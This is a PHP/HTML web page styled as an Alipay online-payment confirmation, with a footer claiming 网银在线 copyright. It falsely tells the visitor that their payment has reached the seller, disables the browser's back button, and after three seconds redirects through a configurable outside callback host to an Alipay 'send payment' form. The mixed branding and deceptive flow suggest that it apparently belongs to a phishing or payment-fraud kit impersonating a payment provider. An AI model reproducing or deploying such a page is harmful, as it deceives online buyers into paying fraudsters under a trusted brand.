<SCRIPT language="JavaScript">
javascript:window.history.forward(1);                             //防止重复提交验证禁止返回
</SCRIPT>

<?php
require('../Data/config.php');
date_default_timezone_set("PRC");
$URL = $Callback."/?goto=https://shenghuo.alipay.com%2Fsend%2Fpayment%2Ffill.htm%3F_pdType%3Dafcabecbafgggffdhjch%26_tosheet%3Dtrue";	       		

header("Cache-control:no-cache,no-store,must-revalidate");
header("Pragma:no-cache");
header("Expires:0");	
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>支付宝 - 网上支付 安全快速</title>
<!-- 以下方式定时转到其他页面 -->
<meta http-equiv="refresh" content="3;url=<?php echo $URL;?>"> 
<style type="text/css">
<!--
.STYLE3 {color: #999999}
.STYLE4 {color: #0099FF}
.STYLE5 {color: #000000}
-->
</style>
</head>

<body>

<style type="text/css">
<!--
.STYLE1 {color: #0099FF}
.STYLE3 {
	color: #999999;
	font-size: medium;
}
.STYLE4 {font-size: small}
-->
</style>
<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <!--DWLayoutTable-->
  <tr>
    <td width="100%" height="350" valign="top"><table width="1000" height="207" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="853"><img src="../images/img/Online.jpg" width="180" height="40" /></td>
      </tr>
      <tr>
        <td height="86" bgcolor="#EEFECD"><img src="../images/img/Payment.jpg" width="329" height="89" /></td>
      </tr>
      <tr>
        <td height="49"><p class="STYLE3">您的货款已经打到商家账户中，如异常请您积极与卖家联系，确保交易顺利完成。</p>          </td>
      </tr>
    </table>
      <div align="center">
        <table width="1000" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td height="97" bgcolor="#F0F0F0"><div align="center" class="STYLE4"><span class="STYLE1 STYLE4">诚征英才 | 联系我们 | International Business</span> <br />
                <span class="STYLE5"><br />
网银在线版权所有 2004-<?php echo date('Y');?> ICP证：沪B2-20150087</span> </div></td>
          </tr>
        </table>
      </div>
      <p align="center">&nbsp;</p>
    <p>&nbsp;</p></td>
  </tr>
</table>
<p>&nbsp;</p>


</body>
</html>

